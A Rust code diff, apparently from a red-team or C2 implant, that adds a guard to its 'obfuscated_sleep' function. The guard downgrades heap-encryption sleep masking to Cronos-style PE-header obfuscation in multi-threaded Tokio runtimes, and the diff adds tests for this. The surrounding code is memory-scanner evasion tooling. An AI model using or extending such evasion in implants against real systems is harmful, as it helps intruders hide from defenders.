@@ -94,6 +94,32 @@ pub async fn obfuscated_sleep(duration_ms: u64, technique: u32) {
     if technique == SLEEP_TECHNIQUE_CRONOS || technique == SLEEP_TECHNIQUE_HEAP_ENC {
         use tracing::warn;
         let heap_enc = technique == SLEEP_TECHNIQUE_HEAP_ENC;
+
+        // Guard: heap encryption XOR-scrambles every live heap allocation for
+        // the duration of the sleep window.  That is only safe when no other
+        // thread accesses heap memory during the window.  In a Tokio
+        // multi-threaded runtime the async worker threads keep running while
+        // spawn_blocking executes, so concurrent heap accesses corrupt
+        // arbitrary in-flight data.  Detect this and downgrade to
+        // SLEEP_TECHNIQUE_CRONOS (PE-header + .rdata obfuscation only, which
+        // does not touch heap allocations) rather than silently corrupting
+        // memory.
+        let heap_enc = if heap_enc {
+            let num_workers = tokio::runtime::Handle::current().metrics().num_workers();
+            if num_workers > 1 {
+                warn!(
+                    num_workers,
+                    "SLEEP_TECHNIQUE_HEAP_ENC requested in a {num_workers}-worker Tokio \
+                     runtime; downgrading to SLEEP_TECHNIQUE_CRONOS to prevent heap corruption"
+                );
+                false
+            } else {
+                heap_enc
+            }
+        } else {
+            heap_enc
+        };
+
         match tokio::task::spawn_blocking(move || imp::cronos_sleep(duration_ms, heap_enc)).await {
             Ok(Ok(())) => return,
             Ok(Err(e)) => {
@@ -787,5 +813,31 @@ mod tests {
 
         assert_eq!(magic_before, magic_after, "PE MZ magic was not restored after Cronos sleep");
         assert_eq!(magic_after, [b'M', b'Z'], "MZ magic does not match expected value");
+    }
+
+    /// [`SLEEP_TECHNIQUE_HEAP_ENC`] must complete without panic or corruption
+    /// when called from inside a multi-threaded Tokio runtime.
+    ///
+    /// On Windows the multi-worker guard downgrades the technique to CRONOS;
+    /// on all other platforms the plain-sleep fallback is used.  Either way
+    /// the function must sleep for at least the requested duration.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn heap_enc_is_safe_in_multi_thread_runtime() {
+        let start = std::time::Instant::now();
+        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;
+        let ms = start.elapsed().as_millis();
+        assert!(ms >= 50, "HeapEnc sleep in multi-thread runtime completed too early: {ms} ms");
+    }
+
+    /// When the Tokio runtime has more than one worker, the number of workers
+    /// reported by `Handle::current().metrics().num_workers()` must be > 1 so
+    /// the guard condition triggers correctly.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn tokio_metrics_report_multiple_workers_in_mt_runtime() {
+        let num_workers = tokio::runtime::Handle::current().metrics().num_workers();
+        assert!(
+            num_workers > 1,
+            "expected > 1 Tokio workers in multi_thread runtime, got {num_workers}"
+        );
     }
 }
